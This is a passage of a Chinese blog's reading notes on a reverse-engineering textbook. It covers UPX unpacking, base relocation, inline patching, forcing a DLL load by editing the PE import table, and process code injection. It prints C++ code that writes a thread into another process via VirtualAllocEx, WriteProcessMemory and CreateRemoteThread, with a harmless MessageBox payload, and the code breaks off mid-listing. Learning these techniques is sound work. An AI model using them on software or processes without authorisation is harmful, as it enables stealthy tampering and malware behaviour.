PE文件格式</h2><p>之前已经学习总结在另一个帖子：<strong><a href="http://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/</a></strong></p><hr><h2 id="第十五章-调试UPX压缩的notepad程序"><a href="#第十五章-调试UPX压缩的notepad程序" class="headerlink" title="第十五章 调试UPX压缩的notepad程序"></a>第十五章 调试UPX压缩的notepad程序</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>GetModuleHandleA()函数：获取程序的imagebase。</li></ul><ul><li>GetProcAdress()函数：从EAT中获取指定名称的API的实际地址。</li></ul><ul><li>pushad命令：将8个通用寄存器（EAX-EDI）的值保存到栈；popad是将栈中的各个值再次回复到各个寄存器。</li></ul><ul><li>在内存复制命令中，ESI指Source，EDI指Destination。调试时，同时设置ESI与EDI时就应该猜想从ESI所指缓冲区到EDI所指缓冲区的内存发生复制。</li></ul><ul><li>ctrl+f11：反复执行step into，ctrl+f12：反复执行step over（都是不显示画面）</li></ul><ul><li>脱壳后修正IAT的原因：压缩后，文件INT(记录API名称，序数)已经损坏。</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>1.从一个循环一个循环的跳出解压缩过程最后找到EP。</p><p>2.利用堆栈平衡的原理，在程序刚开始的的esp处的数据下硬件断点，F9执行，断下的地方即是解压缩完成的地方。</p><p>断点-&gt;硬件访问-&gt;字节</p><h2 id="第十六章-基址重定位表"><a href="#第十六章-基址重定位表" class="headerlink" title="第十六章 基址重定位表"></a>第十六章 基址重定位表</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>PE文件在重定位过程中用到基址重定位表。</p><p>当向进程的虚拟内存加载PE文件（EXE/DLL/SYS）时，文件会被加载到PE头的imagebase所指的地址处，若加载的是DLL(SYS)文件且在imagebase位置处已经加载了DLL(SYS)文件，那么PE装载器就会将其加载到其他未被占用的空间，这就会引起一系列重定位问题。</p><p>创建好进程，EXE文件会首先加载到内存，所以EXE文件无需考虑重定位问题，但windows vista之后的版本引入了ASLR的安全机制。</p><h3 id="基址重定位表"><a href="#基址重定位表" class="headerlink" title="基址重定位表"></a>基址重定位表</h3><p>PE头的DataDirectory[5]记录了它的RVA与SIZE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD VirtualAdress; <span class="comment">//一个基准地址（每个块的基址不同）</span></span><br><span class="line">    DWORD SizeOfBlock; <span class="comment">//块的大小</span></span><br><span class="line">  <span class="comment">//WORD TypeOffset][1]; 在每个块结构体后出现的word型数组。</span></span><br><span class="line">  <span class="comment">//数组中每个值加上上面基址就是硬编码在程序中的地址偏移。</span></span><br><span class="line">  <span class="comment">//数组中每个值的前4位表示：类型；后12位表示：偏移</span></span><br><span class="line">&#125;IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p>以查看notepad程序的重定位表为例：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705203510640.png" alt="image-20200705203510640"></p><h3 id="程序实例分析"><a href="#程序实例分析" class="headerlink" title="程序实例分析"></a>程序实例分析</h3><p>可以看到，程序中的内存地址以硬编码形式存在，如果加载的基地址不同又不进行重定位，程序将内存地址引用错误退出。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705184742277.png" alt="image-20200705184742277"></p><blockquote><p>重定位操作的基本操作原理</p><p><strong>在应用程序中查找硬编码的地址位置</strong></p><p><strong>读取值后，减去imagebase（VA-&gt;RVA）</strong></p><p><strong>加上实际加载的地址（RVA-&gt;VA）</strong></p></blockquote><p>找到第一个硬编码位置：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705204042726.png" alt="image-20200705204042726"></p><p>加载OD，查看指定RVA:<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705204651976-1600246974741.png" alt="image-20200705204651976"></p><p>这里经过的过程：（1）由于imagebase为：<strong>1000000</strong>，所以开始读到的值为：<strong>10010C4</strong>，（2）减去imagebase：<strong>10010C4-1000000 = 10C4</strong>，（3）加上实际的加载基地址：<strong>10C4+F20000 = F210C4</strong></p><p>一直重复上述过程，直到TypeOffset的值为0，则表明一个结构体块结束。对所有结构体块如此，直到遇到NULL（即最后一个结构体以NULL结束）。</p><hr><h2 id="第二十章-“内嵌补丁练习”"><a href="#第二十章-“内嵌补丁练习”" class="headerlink" title="第二十章 “内嵌补丁练习”"></a>第二十章 “内嵌补丁练习”</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>内嵌补丁：内嵌代码补丁的简称，对难以修改指定代码时，在程序中插入并运行被称为“洞穴代码”的补丁代码后对程序打补丁的技术。</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>首先单步调式，很快来到2处解密代码的地方，记录好解密代码区域：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706201923481.png" alt="image-20200706201923481"></p><p>继续单步：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706202406843.png" alt="image-20200706202406843"></p><p>继续：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706202743840.png" alt="image-20200706202743840"></p><blockquote><p>EDX寄存器为4个字节大小，像这样向其中不断加上4个字节的值，就会发生溢出。一般的校验和计算中常常忽略该溢出问题，使用最后一个保存在EDX中的值。</p></blockquote><p>继续单步步入：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706203316068.png" alt="image-20200706203316068"></p><p>最后解密完成，来到OEP：40121E<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706203545470.png" alt="image-20200706203545470"></p><blockquote><p>打内嵌补丁操作：找到写入补丁代码的区域：（1）设置到文件空白区域。（2）扩展最后的节区后设置。（3）添加新节区后设置。</p></blockquote><p>这里直接找空白区域：在.txt节区的：401280开始写入代码：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706205802855.png" alt="image-20200706205802855"></p><p>最后在之前的jmp oep的地方，把oep修改为我们的内嵌补丁。但是注意：jmp oep指令也是加密了的，所以我们要写入异或过的数据。且这里要写入文件中才可以，不能是内存中。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706210952163.png" alt="image-20200706210952163"></p><p>最后，打开文件成功。</p><hr><h2 id="第二十五章-通过修改PE加载DLL"><a href="#第二十五章-通过修改PE加载DLL" class="headerlink" title="第二十五章 通过修改PE加载DLL"></a>第二十五章 通过修改PE加载DLL</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><p>通过“直接修改目标文件的可执行文件”，使其运行时强制加载指定的DLL文件。每当进程开始运行时就会自动加载指定的DLL文件，而<strong>加载了某DLL文件会自动执行其DLLMain。</strong></p><p>本技术关键就是对PE文件头的修改，把之前学习了PE知识应用起来（特别是IMAGE_IMPORT_DESCRIPTOP）。</p><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>对于要强制加载dll文件源代码就是下载一个网页的功能，本技术的关键不在这里，所以我只将我查过其中的一些函数记录下来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">GetModuleFileName</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HMODULE hModule,   <span class="comment">//应用程序或DLL实例句柄,NULL则为获取当前程序可执行文件路径名</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPTSTR lpFilename, <span class="comment">//接收路径的字符串缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nSize        <span class="comment">//接收路径的字符缓冲区的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>; <span class="comment">//函数返回当前进程已加载可执行或DLL文件的完整路径名(以'\0'终止)</span></span><br><span class="line"></span><br><span class="line">_tcsrchr("字符串"， '要查找的字符')</span><br><span class="line"><span class="comment">//返回值：指向最后一次在字符串中出现的该字符的指针，如果要查找的字符再串中没有出现，则返回NULL。</span></span><br><span class="line"></span><br><span class="line">_tcschr("字符串"， '要查找的字符')</span><br><span class="line"><span class="comment">//返回值：指向第一次在字符串中出现的该字符的指针，如果要查找的字符再串中没有出现，则返回NULL。</span></span><br></pre></td></tr></table></figure><p>由于PE文件中导入的DLL信息以结构体列表形式存储在IDT。</p><p>首先查看IDT的所占空间，找到地址，发现以NULL结尾的IID后存在其他数据。所以要添加一个IID的话，我们就要移动IDT到一个新的足够大空间，再在其尾部添加一个IID。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917221854666.png" alt="image-20200917221854666"></p><p>确定移动目标位置：(3种方式)</p><ol><li>查找文件的空白区域。</li><li>增加文件最后一个节区的大小。</li><li>在文件末尾添加新节区。</li></ol><p>首先直接查看本节区中的空白区域，发现有足够的空间，但要计算该区域中加载到进程的虚拟内存的区域，因为只有节区头明确记录的区域才会被加载。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917222618970.png" alt="image-20200917222618970"></p><p>所以还有未被使用的区域大小为：1AA，这是足够的。</p><blockquote><p>节区在磁盘文件中的大小比加载到内存的大小大的原因：</p><p><strong>文件的大小是经过文件对齐后的。</strong></p></blockquote><p>开始修改要记载指定dll的文件：</p><ol><li><p>修改导入表的RVA值及大小。（新移动的区域）</p></li><li><p>删除绑定导入表。（可有可无，提高DLL加载速度的技术）</p><p><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917223157443.png" alt="image-20200917223157443"></p></li><li><p>创建新的IDT，将原IDT复制到新区域并在尾巴添加新的IID。</p></li><li><p>设置Name，INT，IAT。（PE学习已经详细记录了，这里就就只是实操了下）。</p></li><li><p>修改IAT节区的属性值，增加可写属性。<strong>IMAGE_SCN_MEM_WRITE(80000000)</strong>。<strong>所以从40000040 -&gt; C0000040。</strong></p></li></ol><p><strong>最后本章主要是还是对PE文件熟悉了下。</strong></p><hr><h2 id="第二十七章-代码注入"><a href="#第二十七章-代码注入" class="headerlink" title="第二十七章 代码注入"></a>第二十七章 代码注入</h2><p>之前学习了DLL注入，而代码注入与之最大的区别就是只向目标进程注入要运行的代码与数据，注入完成后之后消失。原理类似。</p><p>使用dll注入优点：1.占用内存少。2.难以查找痕迹。3.不需要另外的dll文件，只要有代码注入程序即可。</p><p><strong>整个流程：</strong></p><ul><li><p>改变进程的权限进行提取。</p></li><li><p>代码注入：</p><ol><li>使用GetModuleHandleA()函数获得指定模块（kernel.dll）的句柄，为了获得要用函数的地址。</li><li>使用OpenProcess()函数获得指定PID号的进程的句柄。</li><li>设置THREAD_PARAM结构体变量并对其赋值（<strong>所要使用的函数地址，字符串</strong>），在目标进程申请内存，将该结构体写入目标进程。</li><li>计算出线程函数的大小，在目标进程申请内存，将线程函数的代码写入目标进程。</li><li>使用CreateRemoteThread()函数在目标进程创建一个远程线程（<strong>利用已经写入目标进程内存的数据</strong>）。</li></ol></li></ul><blockquote><p>tips:</p><p>Window OS中，加载到进程的kernel32.dll的地址都相同，所以我们在注入程序中获得的API(“LoadLibraryA”，“GetProcAddress”)的地址与目标程序进程中获取的同然的API的地址是相同的。因此可以直接在注入程序中获得函数的地址。</p></blockquote><p>其实整个流程也很简单，但熟练，用的好还是要多实战经历。</p><p>完整代码：（注释可以看的很清楚）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef int (FAR WINAPI *FARPROC)(); 可以在编译器中查看到。</span></span><br><span class="line"><span class="comment">//typedef _Null_terminated_ CONST CHAR *LPCSTR, *PCSTR;</span></span><br><span class="line"><span class="comment">//#define WINAPI      __stdcall</span></span><br><span class="line"><span class="comment">//typedef void far            *LPVOID;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//函数指针数组</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()</span></span><br><span class="line">    <span class="keyword">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"</span></span><br><span class="line">&#125; THREAD_PARAM, * PTHREAD_PARAM;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LoadLibraryA()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* PFLOADLIBRARYA)</span> <span class="comment">//对函数定义一个别名，下面同。</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetProcAddress()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* PFGETPROCADDRESS)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//MessageBoxA()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* PFMESSAGEBOXA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// "user32.dll"</span></span><br><span class="line">    <span class="keyword">if</span> (!hMod)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// "MessageBoxA"</span></span><br><span class="line">    <span class="keyword">if</span> (!pFunc)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()</span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectCode</span><span class="params">(DWORD dwPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_PARAM    param = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    HANDLE          hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE          hThread = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID          pRemoteBuf[<span class="number">2</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    DWORD           dwSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set THREAD_PARAM</span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">"user32.dll"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">"MessageBoxA"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">"Injected by Bxb"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">"ReverseCore"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open Process</span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,   <span class="comment">// dwDesiredAccess</span></span><br><span class="line">        FALSE,                <span class="comment">// bInheritHandle</span></span><br><span class="line">        dwPID)))             <span class="comment">// dwProcessId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcess() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for THREAD_PARAM</span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">        dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">        MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">        PAGE_READWRITE)))    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">        pRemoteBuf[<span class="number">0</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">        (LPVOID)&amp;param,                 <span class="comment">// lpBuffer</span></span><br><span class="line">        dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">        <span class="literal">NULL</span>))                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for ThreadProc()</span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,          <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                 <span class="comment">// lpAddress</span></span><br><span class="line">        dwSize,               <span class="comment">// dwSize</span></span><br><span class="line">        MEM_COMMIT,           <span class="comment">// flAllocationType</span></span><br><span class="line">        PAGE_EXECUTE_READWRITE)))    <span class="comment">// flProtect</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,                       <span class="comment">// hProcess</span></span><br><span class="line">        pRemoteBuf[<span class="number">1</span>],                  <span class="comment">// lpBaseAddress</span></span><br><span class="line">        (LPVOID)ThreadProc,             <span class="comment">// lpBuffer</span></span><br><span class="line">        dwSize,                         <span class="comment">// nSize</span></span><br><span class="line">        <span class="literal">NULL</span>))                         <span class="comment">// [out] lpNumberOfBytesWritten</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hThread = CreateRemoteThread(hProcess,            <span class="comment">// hProcess</span></span><br><span class="line">        <span class="literal">NULL</span>,                <span class="comment">// lpThreadAttributes</span></span><br><span class="line">        <span class="number">0</span>,                   <span class="comment">// dwStackSize</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],     <span class="comment">// dwStackSize</span></span><br><span class="line">        pRemoteBuf[<span class="number">0</span>],       <span class="comment">// lpParameter</span></span><br><span class="line">        <span class="number">0</span>,                   <span class="comment">// dwCreationFlags</span></span><br><span class="line">        <span class="literal">NULL</span>)))             <span class="comment">// lpThreadId</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span 